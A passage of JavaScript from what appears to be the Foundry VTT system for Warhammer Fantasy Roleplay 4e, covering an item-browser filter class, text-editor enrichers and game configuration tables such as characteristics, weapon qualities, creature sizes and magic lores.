              if (this.filters.dynamic.protects.value.legs && (i.system.AP.lLeg || i.system.AP.rLeg))
                show = true;
              return show;
            });
            break;
          case "prayerType":
            filteredItems = filteredItems.filter(i => !i.system.type || (i.system.type && i.system.type.value == this.filters.dynamic.prayerType.value));
            break;
          case "lore" :         
            // Filter lore key, if filter is on Arcane, search instead for a blank string as a spell's lore
            filteredItems = filteredItems.filter(i => i.system.lore.value == (this.filters.dynamic[filter].value == "arcane" ? "" : this.filters.dynamic[filter].value));
            break;
          default:
            if (this.filters.dynamic[filter].exactMatch)
              filteredItems = filteredItems.filter(i => !i.system[filter] || (i.system[filter] && i.system[filter].value.toString().toLowerCase() == this.filters.dynamic[filter].value.toLowerCase()));
            else
              filteredItems = filteredItems.filter(i => !i.system[filter] || (i.system[filter] && i.system[filter].value.toString().toLowerCase().includes(this.filters.dynamic[filter].value.toLowerCase())));
            break;
        }
      }
    }

    // Each loaded item has a basic filterId number that is used to determine
    // if the item should be shown or not.
    this.filterIds = filteredItems.map(i => i.filterId);
    let list = html.find(".browser-item");
    for (let element of list) {
      if (this.filterIds.includes(Number(element.getAttribute('data-filter-id'))))
        $(element).show();
      else
        $(element).hide();
    }
    return filteredItems;
  }

  // Determines if dynamic filter options should be shown or not.
  // ie. Reach should only be shown if filtering by weapons.
  checkDynamicFilters(html) {
    for (let dynamicFilter in this.filters.dynamic) {
      this.filters.dynamic[dynamicFilter].show = false;
      for (let typeFilter of this.filters.dynamic[dynamicFilter].type) {
        if (this.filters.type[typeFilter].value)
          this.filters.dynamic[dynamicFilter].show = true;
      }

      let filter = html.find(`.${dynamicFilter}`);
      if (this.filters.dynamic[dynamicFilter].show) {
        $(filter).show();
      }
      else {
        $(filter).hide();
      }
    }
  }

  async importResults() {
    let filteredItems = this.applyFilter(this._element).filter(i => i.compendium);
    new Dialog({
      title: game.i18n.localize("Import Results"),
      content: `<p>${game.i18n.format("ITEM.Import", { number: filteredItems.length })}`,
      buttons: {
        yes:
        {
          label: game.i18n.localize("Yes"),
          callback: async html => {
            let folder = await Folder.create({type : "Item", name : "Browser Import"});
            let toCreate = filteredItems.map(i => foundry.utils.mergeObject(i.toObject(), {folder : folder.id}));
            Item.create(toCreate, { renderSheet: false }).then(items => {
              ui.notifications.notify(game.i18n.format("BROWSER.Created", {num : items.length}));
            });
          }
        },
        cancel:
        {
          label: game.i18n.localize("Cancel"),
          callback: html => { return }
        }
      }
    }).render(true);
  }


  // All the filter responses as well as dragging and dropping items.
  activateListeners(html) {

    html.find(".browser-item").each((i, li) => {
      let item = this.items.find(i => i.id == $(li).attr("data-id"));

      li.setAttribute("draggable", true);
      li.addEventListener("dragstart", event => {
        let transfer = {
          type: "Item",
          uuid: item.uuid
        };
        event.dataTransfer.setData("text/plain", JSON.stringify(transfer));
    });
  });

    html.on("click", ".item-name", ev => {
      let itemId = $(ev.currentTarget).parents(".browser-item").attr("data-id");
      this.items.find(i => i.id == itemId).sheet.render(true);

    });

    html.on("click", ".filter", ev => {
      this.filters.type[$(ev.currentTarget).attr("data-filter")].value = $(ev.currentTarget).is(":checked");
      this.applyFilter(html);
    });

    html.on("keyup", ".name-filter", ev => {
      this.filters.attribute.name = $(ev.currentTarget).val();
      this.applyFilter(html);
    });
    html.on("keyup", ".description-filter", ev => {
      this.filters.attribute.description = $(ev.currentTarget).val();
      this.applyFilter(html);
    });
    html.on("click", ".world-filter", ev => {
      this.filters.attribute.worldItems = $(ev.currentTarget).is(":checked");
      this.applyFilter(html);
    });
    html.on("keyup change", ".dynamic-filter", ev => {
      this.filters.dynamic[$(ev.currentTarget).attr("data-filter")].value = $(ev.currentTarget).val();
      this.applyFilter(html);
    });
    html.on("change", ".dynamic-filter-comparator", ev => {
      this.filters.dynamic[$(ev.currentTarget).attr("data-filter")].relation = $(ev.currentTarget).val();
      this.applyFilter(html);
    });
    html.on("change", ".csv-filter", ev => {
      this.filters.dynamic[$(ev.currentTarget).attr("data-filter")].value = $(ev.currentTarget).val().split(",").map(i => {
        return i.trim();
      });
      this.applyFilter(html);
    });
    html.on("change", ".boolean-filter", ev => {
      if ($(ev.currentTarget).hasClass("exactMatch"))
        this.filters.dynamic[$(ev.currentTarget).attr("data-filter")].exactMatch = $(ev.currentTarget).is(":checked");

      else if ($(ev.currentTarget).attr("data-filter"))
        this.filters.dynamic[$(ev.currentTarget).attr("data-filter")].value = $(ev.currentTarget).is(":checked");

      this.applyFilter(html);
    });
    html.on("click", ".protects-filter", ev => {
      this.filters.dynamic.protects.value[$(ev.currentTarget).attr("data-filter")] = $(ev.currentTarget).is(":checked");
      this.applyFilter(html);
    });
  }


  _saveScrollPos() {
    if (this.form === null)
      return;

    const html = this._element;
    if (!html) return
    this.scrollPos = [];
    let lists = $(html.find(".save-scroll"));
    for (let list of lists) {
      this.scrollPos.push($(list).scrollTop());
    }
  }
  _setScrollPos() {
    if (this.scrollPos) {
      const html = this._element;
      let lists = $(html.find(".save-scroll"));
      for (let i = 0; i < lists.length; i++) {
        $(lists[i]).scrollTop(this.scrollPos[i]);
      }
    }
  }

}

Hooks.on("renderCompendiumDirectory", (app, html, data) => {
  if (game.user.isGM || game.settings.get("wfrp4e", "playerBrowser")) {
    const button = $(`<button class="browser-btn" data-tooltip="${game.i18n.localize("BROWSER.Button")}"><i class="fa-solid fa-filter"></i></button>`);
    html.find(".header-actions").append(button);

    button.click(ev => {
      new BrowserWfrp4e().render(true);
    });
  }
});

const WFRP4E = {};
CONFIG.ChatMessage.template = "systems/wfrp4e/templates/chat/chat-message.hbs";

WFRP4E.creditOptions = {
    SPLIT: "split",
    EACH: "each",
};

WFRP4E.toTranslate = [
"statusTiers",
"characteristics",
"characteristicsAbbrev",
"characteristicsBonus",
"skillTypes",
"skillGroup",
"talentMax",
"weaponGroups",
"weaponTypes",
"weaponReaches",
"ammunitionGroups",
"itemQualities",
"itemFlaws",
"weaponQualities",
"weaponFlaws",
"armorQualities",
"armorFlaws",
"armorTypes",
"rangeModifiers",
"rangeBands",
"difficultyLabels",
"difficultyNames",
"locations",
"availability",
"trappingTypes",
"trappingCategories",
"actorSizes",
"magicLores",
"magicWind",
"prayerTypes",
"mutationTypes",
"conditions",
"availabilityTable",
"moneyNames",
"hitLocationTables",
"extendedTestCompletion",
"applyScope",
"weaponGroupDescriptions",
"qualityDescriptions",
"flawDescriptions",
"loreEffectDescriptions",
"conditionDescriptions",
"symptoms",
"symptomDescriptions",
"symptomTreatment",
"reachDescription",
"classTrappings",
"effectApplications"
];

// "Trappings" are more than "trapping" type items
WFRP4E.trappingItems = ["trapping", "armour", "weapon", "container", "ammunition", "money"];

CONFIG.controlIcons.defeated = "systems/wfrp4e/icons/defeated.png";

CONFIG.JournalEntry.noteIcons = {
    "Marker": "systems/wfrp4e/icons/buildings/point_of_interest.png",
    "Apothecary": "systems/wfrp4e/icons/buildings/apothecary.png",
    "Beastmen Herd 1": "systems/wfrp4e/icons/buildings/beastmen_camp1.png",
    "Beastmen Herd 2": "systems/wfrp4e/icons/buildings/beastmen_camp2.png",
    "Blacksmith": "systems/wfrp4e/icons/buildings/blacksmith.png",
    "Bretonnian City 1": "systems/wfrp4e/icons/buildings/bret_city1.png",
    "Bretonnian City 2": "systems/wfrp4e/icons/buildings/bret_city2.png",
    "Bretonnian City 3": "systems/wfrp4e/icons/buildings/bret_city3.png",
    "Bretonnian Worship": "systems/wfrp4e/icons/buildings/bretonnia_worship.png",
    "Caste Hill 1": "systems/wfrp4e/icons/buildings/castle_hill1.png",
    "Caste Hill 2": "systems/wfrp4e/icons/buildings/castle_hill2.png",
    "Caste Hill 3": "systems/wfrp4e/icons/buildings/castle_hill3.png",
    "Castle Wall": "systems/wfrp4e/icons/buildings/castle_wall.png",
    "Cave 1": "systems/wfrp4e/icons/buildings/cave1.png",
    "Cave 2": "systems/wfrp4e/icons/buildings/cave2.png",
    "Cave 3": "systems/wfrp4e/icons/buildings/cave3.png",
    "Cemetery": "systems/wfrp4e/icons/buildings/cemetery.png",
    "Chaos Portal": "systems/wfrp4e/icons/buildings/chaos_portal.png",
    "Chaos Worship": "systems/wfrp4e/icons/buildings/chaos_worship.png",
    "Court": "systems/wfrp4e/icons/buildings/court.png",
    "Dwarf Beer": "systems/wfrp4e/icons/buildings/dwarf_beer.png",
    "Dwarf Hold 1": "systems/wfrp4e/icons/buildings/dwarf_hold1.png",
    "Dwarf Hold 2": "systems/wfrp4e/icons/buildings/dwarf_hold2.png",
    "Dwarf Hold 3": "systems/wfrp4e/icons/buildings/dwarf_hold3.png",
    "Empire Barracks": "systems/wfrp4e/icons/buildings/empire_barracks.png",
    "Empire City 1": "systems/wfrp4e/icons/buildings/empire_city1.png",
    "Empire City 2": "systems/wfrp4e/icons/buildings/empire_city2.png",
    "Empire City 3": "systems/wfrp4e/icons/buildings/empire_city3.png",
    "Farm": "systems/wfrp4e/icons/buildings/farms.png",
    "Food 1": "systems/wfrp4e/icons/buildings/food.png",
    "Food 2": "systems/wfrp4e/icons/buildings/food2.png",
    "Guard Post": "systems/wfrp4e/icons/buildings/guards.png",
    "Haunted Hill": "systems/wfrp4e/icons/buildings/haunted_hill.png",
    "Haunted Wood": "systems/wfrp4e/icons/buildings/haunted_wood.png",
    "Inn 1": "systems/wfrp4e/icons/buildings/inn1.png",
    "Inn 2": "systems/wfrp4e/icons/buildings/inn2.png",
    "Kislev City 1": "systems/wfrp4e/icons/buildings/kislev_city1.png",
    "Kislev City 2": "systems/wfrp4e/icons/buildings/kislev_city2.png",
    "Kislev City 3": "systems/wfrp4e/icons/buildings/kislev_city3.png",
    "Lumber": "systems/wfrp4e/icons/buildings/lumber.png",
    "Magic": "systems/wfrp4e/icons/buildings/magic.png",
    "Metal": "systems/wfrp4e/icons/buildings/metal.png",
    "Mountain 1": "systems/wfrp4e/icons/buildings/mountains1.png",
    "Mountain 2": "systems/wfrp4e/icons/buildings/mountains2.png",
    "Orcs": "systems/wfrp4e/icons/buildings/orcs.png",
    "Orc Camp": "systems/wfrp4e/icons/buildings/orc_city.png",
    "Port": "systems/wfrp4e/icons/buildings/port.png",
    "Road": "systems/wfrp4e/icons/buildings/roads.png",
    "Ruins": "systems/wfrp4e/icons/buildings/ruins.png",
    "Scroll": "systems/wfrp4e/icons/buildings/scroll.png",
    "Sigmar": "systems/wfrp4e/icons/buildings/sigmar_worship.png",
    "Stables": "systems/wfrp4e/icons/buildings/stables.png",
    "Standing Stones": "systems/wfrp4e/icons/buildings/standing_stones.png",
    "Swamp": "systems/wfrp4e/icons/buildings/swamp.png",
    "Temple": "systems/wfrp4e/icons/buildings/temple.png",
    "Textile": "systems/wfrp4e/icons/buildings/textile.png",
    "Tower 1": "systems/wfrp4e/icons/buildings/tower1.png",
    "Tower 2": "systems/wfrp4e/icons/buildings/tower2.png",
    "Tower Hill": "systems/wfrp4e/icons/buildings/tower_hill.png",
    "Wizard Tower": "systems/wfrp4e/icons/buildings/wizard_tower.png",
    "Ulric": "systems/wfrp4e/icons/buildings/ulric_worship.png",
    "Village 1": "systems/wfrp4e/icons/buildings/village1.png",
    "Village 2": "systems/wfrp4e/icons/buildings/village2.png",
    "Village 3": "systems/wfrp4e/icons/buildings/village3.png",
    "Wood Elves 1": "systems/wfrp4e/icons/buildings/welves1.png",
    "Wood Elves 2": "systems/wfrp4e/icons/buildings/welves2.png",
    "Wood Elves 3": "systems/wfrp4e/icons/buildings/welves3.png"
};


CONFIG.TextEditor.enrichers = CONFIG.TextEditor.enrichers.concat([
    {
        pattern : /@Table\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            const a = document.createElement("a");
            a.classList.add("table-click");
            a.dataset.table = match[1];
            a.innerHTML = `<i class="fas fa-list"></i>${(game.wfrp4e.tables.findTable(match[1])?.name && !match[2]) ? game.wfrp4e.tables.findTable(match[1])?.name : match[2]}`;
            return a
        }
    },
    {
        pattern : /@Symptom\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            const a = document.createElement("a");
            a.classList.add("symptom-tag");
            a.dataset.symptom = match[1];
            let id = match[1];
            let label = match[2];
            a.innerHTML = `<i class="fas fa-user-injured"></i>${label ? label : id}`;
            return a
        }
    },
    {
        pattern : /@Condition\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            const a = document.createElement("a");
            a.classList.add("condition-chat");
            a.dataset.cond = match[1];
            let id = match[1];
            let label = match[2];
            a.innerHTML = `<i class="fas fa-user-injured"></i>${label ? label : id}`;
            return a
        }
    },
    {
        pattern : /@Property\[(.+?)](?:{(.+?)})?/gm,
        enricher : (match) => {
            const a = document.createElement("a");
            a.classList.add("property-chat");
            a.dataset.cond = match[1];
            let id = match[1];
            let label = match[2];
            a.innerHTML = `<i class="fas fa-wrench"></i>${label ? label : id}`;
            return a;
        }
    },
    {
        pattern : /@Pay\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            const a = document.createElement("a");
            a.classList.add("pay-link");
            a.dataset.pay = match[1];
            let id = match[1];
            let label = match[2];
            a.innerHTML = `<i class="fas fa-coins"></i>${label ? label : id}`;
            return a
        }
    },
    {
        pattern : /@Credit\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            const a = document.createElement("a");
            a.classList.add("credit-link");
            a.dataset.credit = match[1];
            let id = match[1];
            let label = match[2];
            a.innerHTML = `<i class="fas fa-coins"></i>${label ? label : id}`;
            return a
        }
    },
    {
        pattern : /@Corruption\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            const a = document.createElement("a");
            a.classList.add("corruption-link");
            a.dataset.strength = match[1];
            let id = match[1];
            let label = match[2];
            a.innerHTML = `<img src="systems/wfrp4e/ui/chaos.svg" height=15px width=15px style="border:none">${label ? label : id}`;
            return a
        }
    },
    {
        pattern : /@Fear\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            let values = match[1].split(",");
            const a = document.createElement("a");
            a.classList.add("fear-link");
            a.dataset.value = values[0];
            a.dataset.name = values[1] || "";
            a.innerHTML = `<img src="systems/wfrp4e/ui/fear.svg" height=15px width=15px style="border:none"> ${game.i18n.localize("WFRP4E.ConditionName.Fear")} ${values[0]}`;
            return a
        }
    },
    {
        pattern : /@Terror\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            let values = match[1].split(",");
            const a = document.createElement("a");
            a.classList.add("terror-link");
            a.dataset.value = values[0];
            a.dataset.name = values[1] || "";
            a.innerHTML = `<img src="systems/wfrp4e/ui/terror.svg" height=15px width=15px style="border:none"> ${game.i18n.localize("NAME.Terror")} ${values[0]}`;
            return a
        }
    },
    {
        pattern : /@Exp\[(.+?)\](?:{(.+?)})?/gm,
        enricher : (match, options) => {
            let values = match[1].split(",");
            const a = document.createElement("a");
            a.classList.add("exp-link");
            a.dataset.amount = values[0];
            a.dataset.reason= values[1] || "";
            let label = match[2];
            a.innerHTML = `<i class="fas fa-plus"></i> ${ label ? label : (values[1] || values[0])}</a>`;
            return a
        }
    },
]);

// Status Tiers
WFRP4E.statusTiers = {
    "g": "TIER.Gold",
    "s": "TIER.Silver",
    "b": "TIER.Brass"
};

// Characteristic Names
WFRP4E.characteristics = {
    "ws": "CHAR.WS",
    "bs": "CHAR.BS",
    "s": "CHAR.S",
    "t": "CHAR.T",
    "i": "CHAR.I",
    "ag": "CHAR.Ag",
    "dex": "CHAR.Dex",
    "int": "CHAR.Int",
    "wp": "CHAR.WP",
    "fel": "CHAR.Fel"
};

// Characteristic Abbreviations
WFRP4E.characteristicsAbbrev = {
    "ws": "CHARAbbrev.WS",
    "bs": "CHARAbbrev.BS",
    "s": "CHARAbbrev.S",
    "t": "CHARAbbrev.T",
    "i": "CHARAbbrev.I",
    "ag": "CHARAbbrev.Ag",
    "dex": "CHARAbbrev.Dex",
    "int": "CHARAbbrev.Int",
    "wp": "CHARAbbrev.WP",
    "fel": "CHARAbbrev.Fel"
};

// Characteristic Abbreviations
WFRP4E.characteristicsBonus = {
    "ws": "CHARBonus.WS",
    "bs": "CHARBonus.BS",
    "s": "CHARBonus.S",
    "t": "CHARBonus.T",
    "i": "CHARBonus.I",
    "ag": "CHARBonus.Ag",
    "dex": "CHARBonus.Dex",
    "int": "CHARBonus.Int",
    "wp": "CHARBonus.WP",
    "fel": "CHARBonus.Fel"
};

WFRP4E.skillTypes = {
    "bsc": "Basic",
    "adv": "Advanced"
};

WFRP4E.xpCost = {
    "characteristic": [25, 30, 40, 50, 70, 90, 120, 150, 190, 230, 280, 330, 390, 450, 520],
    "skill": [10, 15, 20, 30, 40, 60, 80, 110, 140, 180, 220, 270, 320, 380, 440]
};

WFRP4E.skillGroup = {
    "isSpec": "ITEM.IsSpec",
    "noSpec": "ITEM.NoSpec"
};

WFRP4E.talentMax = {
    "1": "1",
    "2": "2",
    "3": "3",
    "4": "4",
    "none": "None",
    "ws": "CHARBonus.WS",
    "bs": "CHARBonus.BS",
    "s": "CHARBonus.S",
    "t": "CHARBonus.T",
    "i": "CHARBonus.I",
    "ag": "CHARBonus.Ag",
    "dex": "CHARBonus.Dex",
    "int": "CHARBonus.Int",
    "wp": "CHARBonus.WP",
    "fel": "CHARBonus.Fel"
};


// Weapon Groups
WFRP4E.weaponGroups = {
    "basic": "SPEC.Basic",
    "cavalry": "SPEC.Cavalry",
    "fencing": "SPEC.Fencing",
    "brawling": "SPEC.Brawling",
    "flail": "SPEC.Flail",
    "parry": "SPEC.Parry",
    "polearm": "SPEC.Polearm",
    "twohanded": "SPEC.TwoHanded",
    "blackpowder": "SPEC.Blackpowder",
    "bow": "SPEC.Bow",
    "crossbow": "SPEC.Crossbow",
    "entangling": "SPEC.Entangling",
    "engineering": "SPEC.Engineering",
    "explosives": "SPEC.Explosives",
    "sling": "SPEC.Sling",
    "throwing": "SPEC.Throwing",
    "vehicle": "SPEC.Vehicle",
};

// Given a group, what's the primary type, melee or ranged
WFRP4E.groupToType = {
    "basic": "melee",
    "cavalry": "melee",
    "fencing": "melee",
    "brawling": "melee",
    "flail": "melee",
    "parry": "melee",
    "polearm": "melee",
    "twohanded": "melee",
    "blackpowder": "ranged",
    "bow": "ranged",
    "crossbow": "ranged",
    "entangling": "ranged",
    "engineering": "ranged",
    "explosives": "ranged",
    "sling": "ranged",
    "throwing": "ranged",
    "vehicle" : "ranged"
};

WFRP4E.weaponTypes = {
    "melee": "Melee",
    "ranged": "Ranged"
};

// Weapon Reach
WFRP4E.weaponReaches = {
    "personal": "WFRP4E.Reach.Personal",
    "vshort": "WFRP4E.Reach.VShort",
    "short": "WFRP4E.Reach.Short",
    "average": "WFRP4E.Reach.Average",
    "long": "WFRP4E.Reach.Long",
    "vLong": "WFRP4E.Reach.VLong",
    "massive": "WFRP4E.Reach.Massive",
};

// Ammo Groups
WFRP4E.ammunitionGroups = {
    "BPandEng": "WFRP4E.BPandEng",
    "bow": "WFRP4E.Bow",
    "crossbow": "WFRP4E.Crossbow",
    "sling": "WFRP4E.Sling",
    "vehicle": "WFRP4E.Vehicle",
    "throwing": "SPEC.Throwing",
    "entangling": "SPEC.Entangling",
};

// Item Qualities
WFRP4E.itemQualities = {
    "durable": "PROPERTY.Durable",
    "fine": "PROPERTY.Fine",
    "lightweight": "PROPERTY.Lightweight",
    "practical": "PROPERTY.Practical",
};

// Item Flaws
WFRP4E.itemFlaws = {
    "ugly": "PROPERTY.Ugly",
    "shoddy": "PROPERTY.Shoddy",
    "unreliable": "PROPERTY.Unreliable",
    "bulky": "PROPERTY.Bulky",
};


// Weapon Qualities
WFRP4E.weaponQualities = {
    "accurate": "PROPERTY.Accurate",
    "blackpowder": "PROPERTY.Blackpowder",
    "blast": "PROPERTY.Blast",
    "damaging": "PROPERTY.Damaging",
    "defensive": "PROPERTY.Defensive",
    "distract": "PROPERTY.Distract",
    "entangle": "PROPERTY.Entangle",
    "fast": "PROPERTY.Fast",
    "hack": "PROPERTY.Hack",
    "impact": "PROPERTY.Impact",
    "impale": "PROPERTY.Impale",
    "magical": "PROPERTY.Magical",
    "penetrating": "PROPERTY.Penetrating",
    "pistol": "PROPERTY.Pistol",
    "precise": "PROPERTY.Precise",
    "pummel": "PROPERTY.Pummel",
    "repeater": "PROPERTY.Repeater",
    "shield": "PROPERTY.Shield",
    "trapblade": "PROPERTY.TrapBlade",
    "unbreakable": "PROPERTY.Unbreakable",
    "wrap": "PROPERTY.Wrap"
};

// Weapon Flaws
WFRP4E.weaponFlaws = {
    "dangerous": "PROPERTY.Dangerous",
    "imprecise": "PROPERTY.Imprecise",
    "reload": "PROPERTY.Reload",
    "slow": "PROPERTY.Slow",
    "tiring": "PROPERTY.Tiring",
    "undamaging": "PROPERTY.Undamaging"
};

// Armor Qualities
WFRP4E.armorQualities = {
    "flexible": "PROPERTY.Flexible",
    "impenetrable": "PROPERTY.Impenetrable",
    "magical": "PROPERTY.Magical",
};

// Armor Flaws
WFRP4E.armorFlaws = {
    "partial": "PROPERTY.Partial",
    "weakpoints": "PROPERTY.Weakpoints",
};

WFRP4E.propertyHasValue = {
    "durable": true,
    "fine": true,
    "lightweight": false,
    "practical": false,
    "ugly": false,
    "shoddy": false,
    "unreliable": false,
    "bulky": false,
    "accurate": false,
    "blackpowder": false,
    "blast": true,
    "damaging": false,
    "defensive": false,
    "distract": false,
    "entangle": false,
    "fast": false,
    "hack": false,
    "impact": false,
    "impale": false,
    "magical" : false,
    "penetrating": false,
    "pistol": false,
    "precise": false,
    "pummel": false,
    "repeater": true,
    "shield": true,
    "trapblade": false,
    "unbreakable": false,
    "wrap": false,
    "dangerous": false,
    "imprecise": false,
    "reload": true,
    "slow": false,
    "tiring": false,
    "undamaging": false,
    "flexible": false,
    "impenetrable": false,
    "partial": false,
    "weakpoints": false
};

// Equipment Types
WFRP4E.armorTypes = {
    "softLeather": "WFRP4E.ArmourType.SLeather",
    "boiledLeather": "WFRP4E.ArmourType.BLeather",
    "mail": "WFRP4E.ArmourType.Mail",
    "plate": "WFRP4E.ArmourType.Plate",
    "other": "WFRP4E.ArmourType.Other",
    "otherMetal": "WFRP4E.ArmourType.OtherMetal"
};

// Range Test Modifiers
WFRP4E.rangeModifiers = {
    "Point Blank": "easy",
    "Short Range": "average",
    "Normal": "challenging",
    "Long Range": "difficult",
    "Extreme": "vhard",
};

// Ranges
WFRP4E.rangeBands = {
    "pb": "Point Blank",
    "short": "Short Range",
    "normal": "Normal",
    "long": "Long Range",
    "extreme": "Extreme",
};

// Difficulty Modifiers
WFRP4E.difficultyModifiers = {
    "veasy": 60,
    "easy": 40,
    "average": 20,
    "challenging": 0,
    "difficult": -10,
    "hard": -20,
    "vhard": -30
};

// Difficulty Labels
WFRP4E.difficultyLabels = {

    "veasy": "DIFFICULTY.VEasy",
    "easy": "DIFFICULTY.Easy",
    "average": "DIFFICULTY.Average",
    "challenging": "DIFFICULTY.Challenging",
    "difficult": "DIFFICULTY.Difficult",
    "hard": "DIFFICULTY.Hard",
    "vhard": "DIFFICULTY.VHard"
};

WFRP4E.difficultyNames = {

    "veasy": "DIFFICULTYNAME.VEasy",
    "easy": "DIFFICULTYNAME.Easy",
    "average": "DIFFICULTYNAME.Average",
    "challenging": "DIFFICULTYNAME.Challenging",
    "difficult": "DIFFICULTYNAME.Difficult",
    "hard": "DIFFICULTYNAME.Hard",
    "vhard": "DIFFICULTYNAME.VHard"
};

WFRP4E.locations = {
    "head": "WFRP4E.Locations.head",
    "body": "WFRP4E.Locations.body",
    "rArm": "WFRP4E.Locations.rArm",
    "lArm": "WFRP4E.Locations.lArm",
    "rLeg": "WFRP4E.Locations.rLeg",
    "lLeg": "WFRP4E.Locations.lLeg",
};

// Trapping Availability
WFRP4E.availability = {
    "None": "-",
    "common": "WFRP4E.Availability.Common",
    "scarce": "WFRP4E.Availability.Scarce",
    "rare": "WFRP4E.Availability.Rare",
    "exotic": "WFRP4E.Availability.Exotic",
    "special": "WFRP4E.Availability.Special",
};


// Trapping Types
WFRP4E.trappingTypes = {
    "clothingAccessories": "WFRP4E.TrappingType.ClothingAccessories",
    "foodAndDrink": "WFRP4E.TrappingType.FoodDrink",
    "toolsAndKits": "WFRP4E.TrappingType.ToolsKits",
    "booksAndDocuments": "WFRP4E.TrappingType.BooksDocuments",
    "tradeTools": "WFRP4E.TrappingType.TradeTools", // Unused - combined with tools and kits
    "drugsPoisonsHerbsDraughts": "WFRP4E.TrappingType.DrugsPoisonsHerbsDraughts",
    "ingredient": "WFRP4E.TrappingType.Ingredient",
    "misc": "WFRP4E.TrappingType.Misc",
};

// These categories are used to label items in containers (Trapping tab)
WFRP4E.trappingCategories = {
    "weapon": "WFRP4E.TrappingType.Weapon",
    "armour": "WFRP4E.TrappingType.Armour",
    "money": "WFRP4E.TrappingType.Money",
    "ammunition": "WFRP4E.TrappingType.Ammunition",
    "container": "WFRP4E.TrappingType.Container",
    "clothingAccessories": "WFRP4E.TrappingType.ClothingAccessories",
    "foodAndDrink": "WFRP4E.TrappingType.FoodDrink",
    "toolsAndKits": "WFRP4E.TrappingType.ToolsKits",
    "booksAndDocuments": "WFRP4E.TrappingType.BooksDocuments",
    "tradeTools": "WFRP4E.TrappingType.TradeTools",
    "drugsPoisonsHerbsDraughts": "WFRP4E.TrappingType.DrugsPoisonsHerbsDraughts",
    "ingredient": "WFRP4E.TrappingType.Ingredient",
    "misc": "WFRP4E.TrappingType.Misc",
};

// Creature Sizes
WFRP4E.actorSizes = {
    "tiny": "SPEC.Tiny",
    "ltl": "SPEC.Little",
    "sml": "SPEC.Small",
    "avg": "SPEC.Average",
    "lrg": "SPEC.Large",
    "enor": "SPEC.Enormous",
    "mnst": "SPEC.Monstrous"
};

WFRP4E.vehicleTypes = {
    "water" : "Water",
    "land" : "Land",
    "air" : "Air"
};

WFRP4E.crewBulk = {
    tiny : {
        crew : 0,
        encumbrance : 0
    },
    ltl : {
        crew : 0.25,
        encumbrance : 1
    },
    sml : {
        crew : 0.5,
        encumbrance : 3
    },
    avg : {
        crew : 1,
        encumbrance : 6
    },
    lrg : {
        crew : 3,
        encumbrance : 18
    },
    enor : {
        crew : 9,
        encumbrance : 54
    },
    mnst : {
        crew : 27,
        encumbrance : 162
    }
};

WFRP4E.vehicleActorSizeComparison = {
    tiny : {
        tiny : 0,
        ltl : 4,
        sml : 3,
        avg : 2,
        lrg : 1,
        enor :-1 ,
        mnst : -2,
    },
    ltl : {
        tiny : 0,
        ltl : 0,
        sml : 4,
        avg : 3,
        lrg : 2,
        enor :1 ,
        mnst : -1,
    },
    sml : {
        tiny : 0,
        ltl : 0,
        sml : 0,
        avg : 4,
        lrg : 3,
        enor :2 ,
        mnst : 1,
    },
    avg : {
        tiny : 0,
        ltl : 0,
        sml : 0,
        avg : 0,
        lrg : 4,
        enor :3 ,
        mnst : 2,
    },
    lrg : {
        tiny : 0,
        ltl : 0,
        sml : 0,
        avg : 0,
        lrg : 0,
        enor :4 ,
        mnst : 3,
    },
    enor : {
        tiny : 0,
        ltl : 0,
        sml : 0,
        avg : 0,
        lrg : 0,
        enor : 0,
        mnst : 4,
    },
    mnst : {
        tiny : 0,
        ltl : 0,
        sml : 0,
        avg : 0,
        lrg : 0,
        enor : 0,
        mnst : 0,
    }
};

WFRP4E.actorSizeNums = {
    "tiny": 0,
    "ltl": 1,
    "sml": 2,
    "avg": 3,
    "lrg": 4,
    "enor": 5,
    "mnst": 6
};

WFRP4E.tokenSizes = {
    "tiny": 0.3,
    "ltl": 0.5,
    "sml": 0.8,
    "avg": 1,
    "lrg": 2,
    "enor": 3,
    "mnst": 4
};

// Condition Types
WFRP4E.magicLores = {
    "petty": "WFRP4E.MagicLores.petty",
    "beasts": "WFRP4E.MagicLores.beasts",
    "death": "WFRP4E.MagicLores.death",
    "fire": "WFRP4E.MagicLores.fire",
    "heavens": "WFRP4E.MagicLores.heavens",
    "metal": "WFRP4E.MagicLores.metal",
    "life": "WFRP4E.MagicLores.life",
    "light": "WFRP4E.MagicLores.light",
    "shadow": "WFRP4E.MagicLores.shadow",
    "hedgecraft": "WFRP4E.MagicLores.hedgecraft",
    "witchcraft": "WFRP4E.MagicLores.witchcraft",
    "daemonology": "WFRP4E.MagicLores.daemonology",
    "necromancy": "WFRP4E.MagicLores.necromancy",
    "undivided" : "WFRP4E.MagicLores.undivided",
    "nurgle": "WFRP4E.MagicLores.nurgle",
    "slaanesh": "WFRP4E.MagicLores.slaanesh",
    "tzeentch": "WFRP4E.MagicLores.tzeentch",
};

// Given a Lore, what is the Wind
WFRP4E.magicWind = {
    "petty": "WFRP4E.MagicWind.petty",
    "beasts": "WFRP4E.MagicWind.beasts",
    "death": "WFRP4E.MagicWind.death",
    "fire": "WFRP4E.MagicWind.fire",
    "heavens": "WFRP4E.MagicWind.heavens",
    "metal": "WFRP4E.MagicWind.metal",
    "life": "WFRP4E.MagicWind.life",
    "light": "WFRP4E.MagicWind.light",
    "shadow": "WFRP4E.MagicWind.shadow",
    "hedgecraft": "WFRP4E.MagicWind.hedgecraft",
    "witchcraft": "WFRP4E.MagicWind.witchcraft",
    "daemonology": "WFRP4E.MagicWind.daemonology",
    "necromancy": "WFRP4E.MagicWind.necromancy",
    "undivided": "WFRP4E.MagicWind.undivided",
    "nurgle": "WFRP4E.MagicWind.nurgle",
    "slaanesh": "WFRP4E.MagicWind.slaanesh",
    "tzeentch": "WFRP4E.MagicWind.tzeentch",
};



// Types of prayers
WFRP4E.prayerTypes = {
    "blessing": "WFRP4E.prayerTypes.blessing",
    "miracle": "WFRP4E.prayerTypes.miracle"
};

WFRP4E.mutationTypes = {
    "physical": "WFRP4E.mutationTypes.physical",
    "mental": "WFRP4E.mutationTypes.mental"
};


WFRP4E.conditions = {
    "ablaze": "WFRP4E.ConditionName.Ablaze",
